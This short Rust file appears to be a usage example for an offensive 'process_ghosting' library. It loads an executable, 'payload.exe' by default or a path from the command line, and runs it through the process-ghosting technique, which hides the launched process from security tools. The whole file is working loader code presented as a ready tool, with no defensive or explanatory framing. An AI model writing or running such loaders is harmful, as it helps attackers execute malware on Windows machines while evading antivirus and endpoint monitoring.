//! Load and execute payload from file
//! Author: BlackTechX

use process_ghosting::{GhostingBuilder, init};
use std::env;

fn main() {
    init();

    println!("[*] From File Example\n");

    // Get file path from command line or use default
    let args: Vec<String> = env::args().collect();
    let file_path = if args.len() > 1 {
        &args[1]
    } else {
        "payload.exe"
    };

    println!("[*] Loading payload from: {}", file_path);

    // Use from_file builder method
    match GhostingBuilder::from_file(file_path) {
        Ok(builder) => {
            let result = builder
                .x64()
                .with_logging()
                .execute();

            match result {
                Ok(_) => println!("\n[+] Success!"),
                Err(e) => eprintln!("\n[-] Failed: {}", e),
            }
        }
        Err(e) => {
            eprintln!("[-] Failed to load file: {}", e);
        }
    }
}